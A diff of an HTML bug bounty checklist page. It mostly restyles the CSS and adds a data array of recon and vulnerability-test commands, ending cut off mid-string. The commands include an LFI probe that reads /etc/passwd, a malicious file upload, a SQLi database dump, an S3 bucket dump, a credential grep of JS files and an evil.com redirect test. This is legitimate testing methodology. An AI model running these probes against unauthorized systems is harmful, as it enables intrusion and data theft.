@@ -4,32 +4,34 @@
 <meta charset="UTF-8">
 <title>Recon Tracker — Bug Bounty Methodology 2025</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;600;700;800&family=Space+Mono:wght@400;700&display=swap');
 
 :root{
-  --ink:#15130f;
-  --panel:#1c1a15;
-  --panel-2:#221f19;
-  --line:#3a352b;
-  --line-soft:#2a271f;
-  --paper:#eee7d6;
-  --paper-dim:#a89f8a;
-  --amber:#e2a23b;
-  --amber-dim:#9c7530;
-  --teal:#5fa896;
-  --teal-dim:#2f4d46;
-  --red:#c9604f;
-  --radius:3px;
+  --bg:#FFF2D6;
+  --ink:#181022;
+  --card:#FFFFFF;
+  --pink:#FF3E88;
+  --yellow:#FFC93C;
+  --cyan:#20E0C6;
+  --orange:#FF7A3D;
+  --purple:#8B3FF0;
+  --mint:#3DFFB0;
+  --paper-dim:#6b6178;
+  --code-bg:#181022;
+  --radius:16px;
 }
 *{box-sizing:border-box;}
 html,body{margin:0;padding:0;}
 body{
-  background:var(--ink);
-  color:var(--paper);
-  font-family:'IBM Plex Mono', monospace;
+  background-color:var(--bg);
+  background-image:
+    radial-gradient(circle, rgba(24,16,34,0.08) 1.6px, transparent 1.6px);
+  background-size:22px 22px;
+  color:var(--ink);
+  font-family:'Baloo 2', sans-serif;
   min-height:100vh;
 }
-::selection{background:var(--amber);color:var(--ink);}
+::selection{background:var(--pink);color:#fff;}
 
 /* ---------- layout shell ---------- */
 .wrap{max-width:920px;margin:0 auto;padding:28px 20px 80px;}
@@ -39,27 +41,29 @@ header.top{
   align-items:baseline;
   justify-content:space-between;
   gap:16px;
-  border-bottom:1px solid var(--line);
   padding-bottom:18px;
   margin-bottom:22px;
   flex-wrap:wrap;
 }
-.brand{display:flex;flex-direction:column;gap:2px;}
+.brand{display:flex;flex-direction:column;gap:4px;}
 .brand h1{
-  font-family:'Space Grotesk',sans-serif;
-  font-weight:700;
-  font-size:26px;
+  font-weight:800;
+  font-size:34px;
   margin:0;
   letter-spacing:-0.01em;
-  color:var(--paper);
+  color:var(--ink);
+  text-shadow:4px 4px 0 var(--yellow);
+  transform:rotate(-1.2deg);
+  display:inline-block;
 }
 .brand .sub{
-  font-size:12px;
+  font-family:'Space Mono', monospace;
+  font-size:11.5px;
   color:var(--paper-dim);
   letter-spacing:.02em;
 }
-.brand .sub a{color:var(--amber-dim);text-decoration:none;border-bottom:1px dotted var(--amber-dim);}
-.brand .sub a:hover{color:var(--amber);border-color:var(--amber);}
+.brand .sub a{color:var(--purple);text-decoration:none;border-bottom:2px dotted var(--purple);font-weight:700;}
+.brand .sub a:hover{color:var(--pink);border-color:var(--pink);}
 
 /* ---------- target bar ---------- */
 .targetbar{
@@ -67,149 +71,229 @@ header.top{
   align-items:center;
   gap:10px;
   flex-wrap:wrap;
-  margin-bottom:22px;
+  margin-bottom:18px;
 }
 .targetbar select{
-  background:var(--panel);
-  color:var(--paper);
-  border:1px solid var(--line);
-  border-radius:var(--radius);
-  padding:9px 12px;
-  font-family:inherit;
+  background:var(--card);
+  color:var(--ink);
+  border:3px solid var(--ink);
+  border-radius:999px;
+  padding:9px 16px;
+  font-family:'Baloo 2', sans-serif;
+  font-weight:600;
   font-size:14px;
   min-width:180px;
+  box-shadow:3px 3px 0 var(--ink);
 }
 .btn{
-  background:var(--panel);
-  color:var(--paper);
-  border:1px solid var(--line);
-  border-radius:var(--radius);
-  padding:9px 14px;
-  font-family:inherit;
+  background:var(--card);
+  color:var(--ink);
+  border:3px solid var(--ink);
+  border-radius:999px;
+  padding:9px 16px;
+  font-family:'Baloo 2', sans-serif;
+  font-weight:700;
   font-size:13px;
   cursor:pointer;
-  transition:border-color .15s ease, color .15s ease;
+  box-shadow:3px 3px 0 var(--ink);
+  transition:transform .1s ease, box-shadow .1s ease;
   white-space:nowrap;
 }
-.btn:hover{border-color:var(--amber-dim);color:var(--amber);}
-.btn.danger:hover{border-color:var(--red);color:var(--red);}
-.btn.primary{background:var(--amber);color:var(--ink);border-color:var(--amber);font-weight:600;}
-.btn.primary:hover{background:#ecb453;color:var(--ink);}
+.btn:hover{transform:translate(-1px,-2px);box-shadow:5px 5px 0 var(--ink);}
+.btn:active{transform:translate(1px,2px);box-shadow:1px 1px 0 var(--ink);}
+.btn.primary{background:var(--cyan);}
+.btn.danger{background:var(--pink);color:#fff;}
+
+/* ---------- approach filter ---------- */
+.filterbar{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:22px;
+  flex-wrap:wrap;
+}
+.filterbar .flabel{
+  font-family:'Space Mono', monospace;
+  font-size:11px;
+  letter-spacing:.06em;
+  color:var(--paper-dim);
+  font-weight:700;
+}
+.segmented{
+  display:inline-flex;
+  border:3px solid var(--ink);
+  border-radius:999px;
+  overflow:hidden;
+  box-shadow:3px 3px 0 var(--ink);
+}
+.segmented button{
+  background:var(--card);
+  border:none;
+  color:var(--ink);
+  font-family:'Baloo 2', sans-serif;
+  font-weight:700;
+  font-size:13px;
+  padding:8px 16px;
+  cursor:pointer;
+  transition:background .15s ease, color .15s ease;
+}
+.segmented button + button{border-left:3px solid var(--ink);}
+.segmented button.active{background:var(--orange);color:#fff;}
+.segmented button:not(.active):hover{background:var(--yellow);}
 
 /* ---------- overall progress ---------- */
 .overall{
-  border:1px solid var(--line);
+  border:3px solid var(--ink);
   border-radius:var(--radius);
-  background:var(--panel);
-  padding:16px 18px;
+  background:var(--card);
+  padding:18px 20px;
   margin-bottom:26px;
+  box-shadow:5px 5px 0 var(--ink);
 }
-.overall-top{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;}
-.overall-top .label{font-size:12px;letter-spacing:.04em;color:var(--paper-dim);}
-.overall-top .count{font-family:'Space Grotesk',sans-serif;font-size:20px;color:var(--amber);font-weight:700;}
-.bar{height:6px;background:var(--line-soft);border-radius:4px;overflow:hidden;}
-.bar-fill{height:100%;background:linear-gradient(90deg,var(--amber-dim),var(--amber));transition:width .3s ease;}
+.overall-top{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:12px;flex-wrap:wrap;gap:6px;}
+.overall-top .label{font-family:'Space Mono', monospace;font-size:11px;letter-spacing:.04em;color:var(--paper-dim);font-weight:700;}
+.overall-top .count{font-weight:800;font-size:22px;color:var(--pink);}
+.bar{height:14px;background:var(--bg);border:2px solid var(--ink);border-radius:999px;overflow:hidden;}
+.bar-fill{height:100%;background:linear-gradient(90deg,var(--pink),var(--orange),var(--yellow),var(--cyan));transition:width .3s ease;}
 
 /* ---------- sections ---------- */
 .section{
-  border:1px solid var(--line);
+  border:3px solid var(--ink);
   border-radius:var(--radius);
-  margin-bottom:14px;
-  background:var(--panel);
+  margin-bottom:16px;
+  background:var(--card);
   overflow:hidden;
+  box-shadow:5px 5px 0 var(--ink);
 }
+.section:nth-of-type(7n+1){ --accent:var(--pink); }
+.section:nth-of-type(7n+2){ --accent:var(--cyan); }
+.section:nth-of-type(7n+3){ --accent:var(--yellow); }
+.section:nth-of-type(7n+4){ --accent:var(--orange); }
+.section:nth-of-type(7n+5){ --accent:var(--purple); }
+.section:nth-of-type(7n+6){ --accent:var(--mint); }
+.section:nth-of-type(7n+7){ --accent:var(--pink); }
+
 .section-head{
   display:flex;
   align-items:center;
   justify-content:space-between;
-  padding:14px 18px;
+  padding:15px 18px;
   cursor:pointer;
   user-select:none;
+  background:var(--accent);
+  border-bottom:3px solid var(--ink);
 }
-.section-head:hover{background:var(--panel-2);}
+.section.open .section-head{border-bottom:3px solid var(--ink);}
+.section:not(.open) .section-head{border-bottom:none;}
+.section-head:hover{filter:brightness(1.05);}
 .section-head .title{
-  font-family:'Space Grotesk',sans-serif;
+  font-weight:700;
   font-size:16px;
-  font-weight:600;
-  color:var(--paper);
+  color:var(--ink);
 }
 .section-head .meta{
   display:flex;
   align-items:center;
   gap:12px;
-  color:var(--paper-dim);
+  color:var(--ink);
+  font-family:'Space Mono', monospace;
   font-size:12px;
 }
 .section-head .chip{
-  border:1px solid var(--line);
+  border:2px solid var(--ink);
+  background:var(--card);
   border-radius:20px;
-  padding:2px 9px;
+  padding:2px 10px;
   font-size:11px;
+  font-weight:700;
 }
-.section-head .chip.done{border-color:var(--teal-dim);color:var(--teal);}
-.section-head .caret{transition:transform .2s ease;color:var(--paper-dim);font-size:11px;}
+.section-head .chip.done{background:var(--ink);color:var(--mint);}
+.section-head .caret{transition:transform .2s ease;color:var(--ink);font-size:13px;font-weight:700;}
 .section.open .caret{transform:rotate(90deg);}
 
 .section-body{
   display:none;
-  padding:4px 18px 16px;
-  border-top:1px solid var(--line-soft);
+  padding:6px 18px 18px;
 }
 .section.open .section-body{display:block;}
 
-.subsection{margin-top:14px;}
+.subsection{margin-top:16px;}
 .subsection .subtitle{
-  font-size:12px;
+  display:inline-block;
+  font-size:11px;
   letter-spacing:.03em;
-  color:var(--amber-dim);
-  text-transform:uppercase;
-  margin-bottom:8px;
-  font-family:'Space Grotesk',sans-serif;
-  font-weight:600;
+  color:var(--ink);
+  background:var(--yellow);
+  border:2px solid var(--ink);
+  border-radius:999px;
+  padding:3px 12px;
+  margin-bottom:10px;
+  font-weight:700;
+  font-family:'Space Mono', monospace;
+  transform:rotate(-1deg);
 }
 
 .item{
-  border-bottom:1px solid var(--line-soft);
+  border-bottom:2px dashed #d9cbb0;
 }
 .item:last-child{border-bottom:none;}
 .item-row{
   display:flex;
   align-items:flex-start;
   gap:10px;
-  padding:9px 2px;
+  padding:10px 2px;
+  flex-wrap:wrap;
+}
+.check-area{
+  display:flex;
+  align-items:flex-start;
+  gap:10px;
   cursor:pointer;
+  flex:1 1 auto;
+  min-width:0;
 }
 .item-row .box{
   flex:0 0 auto;
-  width:16px;height:16px;
-  margin-top:2px;
-  border:1px solid var(--paper-dim);
-  border-radius:3px;
+  width:20px;height:20px;
+  margin-top:1px;
+  border:3px solid var(--ink);
+  border-radius:6px;
   display:flex;align-items:center;justify-content:center;
-  transition:background .15s ease, border-color .15s ease;
+  background:var(--card);
+  transition:background .15s ease, transform .1s ease;
 }
-.item.done .box{background:var(--teal);border-color:var(--teal);}
-.item.done .box::after{content:"✓";font-size:11px;color:var(--ink);line-height:1;}
+.item.done .box{background:var(--mint);transform:rotate(-6deg);}
+.item.done .box::after{content:"✓";font-size:13px;color:var(--ink);line-height:1;font-weight:800;}
 .item-row .name{
-  font-size:14px;
-  color:var(--paper);
+  font-size:14.5px;
+  font-weight:600;
+  color:var(--ink);
   line-height:1.4;
 }
-.item.done .name{color:var(--paper-dim);text-decoration:line-through;text-decoration-color:var(--line);}
+.item.done .name{color:var(--paper-dim);text-decoration:line-through;text-decoration-color:var(--pink);text-decoration-thickness:2px;}
 .item-row .expander{
-  margin-left:auto;
-  color:var(--paper-dim);
+  color:var(--ink);
+  font-family:'Space Mono', monospace;
   font-size:11px;
+  font-weight:700;
   flex:0 0 auto;
-  padding-top:2px;
+  padding:5px 10px;
+  margin:-4px -4px 0 0;
+  cursor:pointer;
+  border-radius:999px;
+  border:2px solid var(--ink);
+  background:var(--card);
 }
+.item-row .expander:hover{background:var(--cyan);}
+.item.expanded .item-row .expander{background:var(--orange);color:#fff;}
+
 .item-cmd{
   display:none;
-  margin:0 0 10px 26px;
-  padding:10px 12px;
-  background:var(--ink);
-  border:1px solid var(--line-soft);
-  border-radius:var(--radius);
+  margin:2px 0 12px 30px;
+  padding:12px 14px;
+  background:var(--code-bg);
+  border:3px solid var(--ink);
+  border-radius:12px;
   position:relative;
 }
 .item.expanded .item-cmd{display:block;}
@@ -217,63 +301,98 @@ header.top{
   margin:0;
   white-space:pre-wrap;
   word-break:break-all;
+  font-family:'Space Mono', monospace;
   font-size:12.5px;
-  color:var(--teal);
-  line-height:1.5;
+  color:var(--mint);
+  line-height:1.6;
   padding-right:60px;
 }
 .copy-btn{
   position:absolute;
-  top:8px;right:8px;
-  background:transparent;
-  border:1px solid var(--line);
-  color:var(--paper-dim);
-  font-family:inherit;
+  top:10px;right:10px;
+  background:var(--yellow);
+  border:2px solid var(--ink);
+  color:var(--ink);
+  font-family:'Space Mono', monospace;
+  font-weight:700;
   font-size:10px;
-  padding:3px 8px;
-  border-radius:3px;
+  padding:4px 9px;
+  border-radius:999px;
   cursor:pointer;
 }
-.copy-btn:hover{border-color:var(--amber-dim);color:var(--amber);}
+.copy-btn:hover{background:var(--pink);color:#fff;}
+
+/* item type badges */
+.tag-badge{
+  flex:0 0 auto;
+  font-family:'Space Mono', monospace;
+  font-size:9.5px;
+  letter-spacing:.03em;
+  font-weight:700;
+  padding:3px 9px;
+  border-radius:999px;
+  border:2px solid var(--ink);
+  color:var(--ink);
+  margin-top:1px;
+}
+.tag-badge.passive{background:var(--cyan);transform:rotate(-3deg);}
+.tag-badge.active-tag{background:var(--orange);color:#fff;transform:rotate(2deg);}
+.tag-badge.new{background:var(--pink);color:#fff;transform:rotate(3deg);}
+.tag-badge.advanced{background:var(--purple);color:#fff;transform:rotate(-2deg);}
+.tag-badge.chain{background:var(--ink);color:var(--mint);transform:rotate(2deg);}
+#advancedToggle.on{background:var(--purple);color:#fff;}
+.subsection .empty-filter{
+  font-family:'Space Mono', monospace;
+  font-size:12px;
+  color:var(--paper-dim);
+  padding:6px 0 10px;
+  font-style:italic;
+}
 
 /* ---------- empty / modal ---------- */
 .empty-state{
   text-align:center;
   padding:60px 20px;
   color:var(--paper-dim);
+  background:var(--card);
+  border:3px solid var(--ink);
+  border-radius:var(--radius);
+  box-shadow:5px 5px 0 var(--ink);
 }
 .empty-state h2{
-  font-family:'Space Grotesk',sans-serif;
-  color:var(--paper);
-  font-size:20px;
+  color:var(--ink);
+  font-size:22px;
   margin-bottom:8px;
+  font-weight:800;
 }
-.empty-state p{font-size:13px;max-width:420px;margin:0 auto 20px;line-height:1.6;}
+.empty-state p{font-size:13px;max-width:420px;margin:0 auto 20px;line-height:1.6;font-family:'Space Mono', monospace;}
 
 .modal-backdrop{
   display:none;
   position:fixed;inset:0;
-  background:rgba(10,9,7,.7);
+  background:rgba(24,16,34,.6);
   align-items:center;justify-content:center;
   z-index:50;
 }
 .modal-backdrop.open{display:flex;}
 .modal{
-  background:var(--panel);
-  border:1px solid var(--line);
+  background:var(--card);
+  border:3px solid var(--ink);
   border-radius:var(--radius);
-  padding:22px;
+  padding:24px;
   width:90%;max-width:340px;
+  box-shadow:6px 6px 0 var(--ink);
 }
-.modal h3{margin:0 0 14px;font-family:'Space Grotesk',sans-serif;font-size:16px;}
+.modal h3{margin:0 0 14px;font-size:18px;font-weight:800;}
 .modal input{
   width:100%;
-  background:var(--ink);
-  border:1px solid var(--line);
-  color:var(--paper);
-  padding:10px 12px;
-  border-radius:var(--radius);
-  font-family:inherit;
+  background:var(--bg);
+  border:3px solid var(--ink);
+  color:var(--ink);
+  padding:10px 14px;
+  border-radius:999px;
+  font-family:'Baloo 2', sans-serif;
+  font-weight:600;
   font-size:14px;
   margin-bottom:14px;
 }
@@ -281,19 +400,22 @@ header.top{
 
 footer.disclaimer{
   margin-top:34px;
-  padding-top:16px;
-  border-top:1px solid var(--line-soft);
+  padding:14px 16px;
+  border:2px dashed var(--ink);
+  border-radius:12px;
+  font-family:'Space Mono', monospace;
   font-size:11px;
   color:var(--paper-dim);
   line-height:1.6;
 }
 
 @media (max-width:560px){
-  .brand h1{font-size:21px;}
+  .brand h1{font-size:26px;}
   .section-head .title{font-size:14px;}
   .item-row .name{font-size:13px;}
 }
 </style>
+
 </head>
 <body>
 <div class="wrap">
@@ -308,8 +430,19 @@ footer.disclaimer{
   <div class="targetbar">
     <select id="targetSelect"></select>
     <button class="btn primary" id="addTargetBtn">+ New target</button>
+    <button class="btn primary" id="exportScriptBtn">⬇ Export Script</button>
     <button class="btn danger" id="resetBtn">Reset checklist</button>
     <button class="btn danger" id="deleteTargetBtn">Delete target</button>
+  </div>
+
+  <div class="filterbar">
+    <span class="flabel">APPROACH</span>
+    <div class="segmented" id="filterSegment">
+      <button data-filter="all" class="active">All</button>
+      <button data-filter="passive">Passive</button>
+      <button data-filter="active">Active</button>
+    </div>
+    <button class="btn" id="advancedToggle">🔒 Advanced Mode: Off</button>
   </div>
 
   <div id="mainArea"></div>
@@ -331,7 +464,7 @@ footer.disclaimer{
 </div>
 
 <script>
-const METHOD = [{"title": "1. Reconnaissance and Subdomain Enumeration", "subs": [{"title": "1.1 Passive Subdomain Enumeration", "items": [{"name": "Subfinder", "cmd": "subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt"}, {"name": "Amass (Passive Mode)", "cmd": "amass enum -passive -d target.com -o amass_passive_subs.txt"}, {"name": "CRT.sh Query", "cmd": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | anew crtsh_subs.txt"}, {"name": "Github Dorking", "cmd": "github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt"}, {"name": "Results Combination", "cmd": "cat *_subs.txt | sort -u | anew all_subs.txt"}]}, {"title": "1.2 Active Subdomain Enumeration", "items": [{"name": "MassDNS", "cmd": "massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt"}, {"name": "Shuffledns", "cmd": "shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt"}, {"name": "DNSX Resolution", "cmd": "dnsx -l active_subs.txt -resp -o resolved_subs.txt"}, {"name": "SubBrute", "cmd": "python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt"}, {"name": "FFuF Subdomain", "cmd": "ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt"}]}, {"title": "1.3 Handling Specific (Non-Wildcard) Targets", "items": [{"name": "GAU", "cmd": "gau target.example.com | anew gau_results.txt"}, {"name": "Waybackurls", "cmd": "waybackurls target.example.com | anew wayback_results.txt"}, {"name": "Katana", "cmd": "katana -u target.example.com -silent -jc -o katana_results.txt"}, {"name": "Hakrawler", "cmd": "echo \"https://target.example.com\" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt"}]}, {"title": "Additional Advanced Techniques", "items": [{"name": "Reverse DNS", "cmd": "dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt"}, {"name": "ASN Enumeration", "cmd": "amass intel -asn <ASN_NUMBER> -o asn_results.txt"}, {"name": "Cloud Asset Enumeration", "cmd": "cloud_enum -k target.com"}, {"name": "Results Validation", "cmd": "cat all_subs.txt | httpx -silent -title -o live_subdomains.txt"}]}]}, {"title": "2. Discovery and Probing", "subs": [{"title": "2.1 HTTP Probing", "items": [{"name": "HTTPX Probing", "cmd": "httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt"}, {"name": "Custom Filtering", "cmd": "cat live_websites.txt | grep -i \"login\\|admin\" | tee login_endpoints.txt"}]}, {"title": "2.2 JavaScript Analysis", "items": [{"name": "JS Extraction", "cmd": "cat live_websites.txt | waybackurls | grep \"\\.js\" | anew js_files.txt"}, {"name": "LinkFinder Analysis", "cmd": "python3 linkfinder.py -i js_files.txt -o js_endpoints.txt"}, {"name": "Sensitive Pattern Search", "cmd": "cat js_files.txt | gf aws-keys | tee aws_keys.txt\ncat js_files.txt | gf urls | tee sensitive_urls.txt"}, {"name": "API Key Validation", "cmd": "curl -X GET \"https://api.example.com/resource\" -H \"Authorization: Bearer <extracted_key>\""}]}, {"title": "2.3 Advanced Google Dorking", "items": [{"name": "Automated Dorking", "cmd": "python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt"}, {"name": "Admin/Login Files", "cmd": "site:*.example.com inurl:\"*admin | login\" | inurl:.php | .asp"}, {"name": "Config Files", "cmd": "site:*.example.com ext:env | ext:yaml | ext:ini"}, {"name": "Public Keys", "cmd": "site:*.example.com inurl:\"id_rsa.pub\" | inurl:\".pem\""}]}, {"title": "2.4 URL Discovery", "items": [{"name": "Katana Crawling", "cmd": "katana -list live_websites.txt -jc -o katana_urls.txt"}, {"name": "Gospider", "cmd": "gospider -s \"https://target.com\" -d 2 -o gospider_output/"}, {"name": "Hakrawler", "cmd": "echo \"https://target.com\" | hakrawler -depth 3 -plain -out hakrawler_results.txt"}]}, {"title": "2.5 Archive Enumeration", "items": [{"name": "Archive URL Collection", "cmd": "gau --subs target.com | anew archived_urls.txt\nwaybackurls target.com | anew wayback_urls.txt"}, {"name": "Parameter Extraction", "cmd": "cat archived_urls.txt | grep \"=\" | anew parameters.txt"}]}]}, {"title": "3. Advanced Enumeration Techniques", "subs": [{"title": "3.1 Parameter Discovery", "items": [{"name": "Arjun Parameter Discovery", "cmd": "arjun -u \"https://target.example.com\" -m GET,POST --stable -o params.json"}, {"name": "ParamSpider Web Parameters", "cmd": "python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt"}, {"name": "FFuF Parameter Bruteforce", "cmd": "ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt"}]}, {"title": "3.2 Cloud Asset Enumeration", "items": [{"name": "Cloud Bucket Enumeration", "cmd": "cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt"}, {"name": "S3 Bucket Access Test", "cmd": "aws s3 ls s3://<bucket_name> --no-sign-request"}, {"name": "S3 Bucket Content Dump", "cmd": "python3 AWSBucketDump.py -b target-bucket -o dumped_data/"}]}, {"title": "3.3 Content Discovery", "items": [{"name": "Feroxbuster", "cmd": "feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt"}, {"name": "Dirsearch", "cmd": "dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt"}, {"name": "FFuF Recursive", "cmd": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt"}]}, {"title": "3.4 API Enumeration", "items": [{"name": "Kiterunner", "cmd": "kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt"}]}, {"title": "3.5 ASN Mapping", "items": [{"name": "ASN Lookup", "cmd": "amass intel -asn <ASN_Number> -o asn_ips.txt"}, {"name": "Shodan Enumeration", "cmd": "shodan search \"net:<ip_range>\" --fields ip_str,port --limit 100"}, {"name": "Censys Asset Search", "cmd": "censys search \"autonomous_system.asn:<ASN_Number>\" -o censys_assets.txt"}]}]}, {"title": "4. Vulnerability Testing", "subs": [{"title": "4.1 High-Priority Vulnerabilities", "items": [{"name": "\ud83d\udc1eCSRF Testing", "cmd": "cat live_websites.txt | gf csrf | tee csrf_endpoints.txt"}, {"name": "\ud83d\udc1eLFI Testing", "cmd": "cat live_websites.txt | gf lfi | qsreplace \"/etc/passwd\" | xargs -I@ curl -s @ | grep \"root:x:\" > lfi_results.txt"}, {"name": "\ud83d\udc1eRCE Testing", "cmd": "curl -X POST -F \"file=@exploit.php\" https://target.com/upload"}, {"name": "\ud83d\udc1eSQLi Testing", "cmd": "ghauri -u \"https://target.com?id=1\" --dbs --batch"}, {"name": "\ud83d\udc1eSensitive Data Search", "cmd": "cat js_files.txt | grep -Ei \"key|token|auth|password\" > sensitive_data.txt"}, {"name": "\ud83d\udc1eOpen Redirect Test", "cmd": "cat urls.txt | grep \"=http\" | qsreplace \"https://evil.com\" | xargs -I@ curl -I -s @ | grep \"evil.com\""}]}]}, {"title": "5. The \"Two-Eye\" Approach \ud83d\udc40", "subs": [{"title": "Actionable Steps", "items": [{"name": "First Eye \u2014 test every gathered subdomain/endpoint/parameter for common vulns", "cmd": null}, {"name": "Second Eye \u2014 hunt for interesting findings (exposed creds, forgotten subdomains, admin panels)", "cmd": null}, {"name": "Build a POC for any confirmed vulnerability and test its real impact", "cmd": null}, {"name": "No vuln found? Pivot to deeper testing on unique subdomains/endpoints", "cmd": null}]}]}, {"title": "6. Proof of Concept (POC) Creation", "subs": [{"title": "Capture Evidence", "items": [{"name": "Video POC \u2014 screen-record the exploit end-to-end (OBS Studio)", "cmd": null}, {"name": "Screenshot POC \u2014 capture clear before/after screenshots (Greenshot)", "cmd": null}]}]}, {"title": "7. Reporting", "subs": [{"title": "Write the Report", "items": [{"name": "Overview \u2014 one-line summary of the vulnerability", "cmd": null}, {"name": "Description \u2014 technical explanation of the issue", "cmd": null}, {"name": "Steps to Reproduce \u2014 numbered, reproducible steps", "cmd": null}, {"name": "Impact \u2014 what an attacker can actually do with it", "cmd": null}, {"name": "Proof of Concept \u2014 attach video/screenshots", "cmd": null}, {"name": "Recommendations \u2014 concrete remediation advice", "cmd": null}, {"name": "References \u2014 CWE/CVE/OWASP links", "cmd": null}, {"name": "Keep it clear, concise, and reproducible by anyone", "cmd": null}]}]}];
+const METHOD = [{"title": "1. Reconnaissance and Subdomain Enumeration", "subs": [{"title": "1.1 Passive Subdomain Enumeration", "items": [{"name": "Subfinder", "cmd": "subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Amass (Passive Mode)", "cmd": "amass enum -passive -d target.com -o amass_passive_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "CRT.sh Query", "cmd": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | anew crtsh_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Github Dorking", "cmd": "github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Chaos (ProjectDiscovery dataset)", "cmd": "chaos -d target.com -silent -o chaos_subs.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Assetfinder", "cmd": "assetfinder --subs-only target.com | anew assetfinder_subs.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Results Combination", "cmd": "cat *_subs.txt | sort -u | anew all_subs.txt", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "1.2 Active Subdomain Enumeration", "items": [{"name": "MassDNS", "cmd": "massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "PureDNS (resolve + bruteforce, wildcard-safe)", "cmd": "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w active_subs.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Shuffledns", "cmd": "shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "DNSX Resolution", "cmd": "dnsx -l active_subs.txt -resp -o resolved_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "SubBrute", "cmd": "python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Subdomain", "cmd": "ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "1.3 Handling Specific (Non-Wildcard) Targets", "items": [{"name": "GAU", "cmd": "gau target.example.com | anew gau_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Waybackurls", "cmd": "waybackurls target.example.com | anew wayback_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Katana", "cmd": "katana -u target.example.com -silent -jc -o katana_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Hakrawler", "cmd": "echo \"https://target.example.com\" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "Additional Advanced Techniques", "items": [{"name": "Reverse DNS", "cmd": "dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "ASN Enumeration", "cmd": "amass intel -asn <ASN_NUMBER> -o asn_results.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Asnmap (ProjectDiscovery ASN \u2192 CIDR)", "cmd": "asnmap -d target.com -silent -o asn_ranges.txt", "type": "passive", "new": true, "advanced": false, "chain": false}, {"name": "Cloud Asset Enumeration", "cmd": "cloud_enum -k target.com", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Naabu Port Scan", "cmd": "naabu -l resolved_subs.txt -top-ports 1000 -silent -o open_ports.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Tlsx Certificate SAN Harvesting", "cmd": "tlsx -l resolved_subs.txt -san -cn -silent -o tls_subs.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Results Validation", "cmd": "cat all_subs.txt | httpx -silent -title -o live_subdomains.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "1.4 Advanced: Permutation & Chained Discovery", "items": [{"name": "Gotator Permutation Wordlist", "cmd": "gotator -sub subs.txt -perm permutations_list.txt -depth 2 -numbers 3 -mindup -adv -md > permutations.txt", "type": null, "new": true, "advanced": true, "chain": false}, {"name": "AlterX + PureDNS Mutation Chain", "cmd": "subfinder -d target.com -silent | alterx -enrich | puredns resolve -r resolvers.txt | httpx -silent -o advanced_live.txt", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "DNS Zone Transfer Attempt", "cmd": "dig axfr @ns1.target.com target.com", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Full Mega-Recon One-Liner", "cmd": "subfinder -d target.com -silent | anew all.txt; assetfinder --subs-only target.com | anew all.txt; amass enum -passive -d target.com | anew all.txt; cat all.txt | dnsx 